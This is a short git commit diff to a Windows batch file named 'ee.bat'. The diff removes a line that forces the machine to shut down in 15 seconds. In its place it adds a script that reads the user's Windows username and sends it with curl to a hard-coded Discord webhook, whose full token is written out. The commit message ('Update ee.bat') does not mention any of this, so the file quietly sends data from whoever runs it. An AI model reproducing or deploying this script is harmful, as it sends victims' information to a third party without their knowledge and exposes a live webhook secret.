6a1edd747e3b0b01515e51f8bd7ae6ed2850df60
nil071n <partanenolandernils@gmail.com>
2025-04-07 11:15:49 +0200

    Update ee.bat

--- ee.bat
+++ ee.bat
@@ -1,1 +1,12 @@
-shutdown -s -t 15
+@echo off
+:: Set the webhook URL
+set "webhook=https://discord.com/api/webhooks/1358731296016306186/1OlY9vkgy8hYRtn9HDxGt96rCeL3dXjfjLjzsZk-GlDJHJ2idGwQre-QyiFFMmGUHmZG"
+
+:: Get the Windows username
+set "message=Username: %USERNAME%"
+
+:: Send the username to the webhook
+curl -X POST -H "Content-Type: application/json" --data "{\"content\": \"%message%\"}" %webhook%
+
+:: Optional pause to see result before closing
+
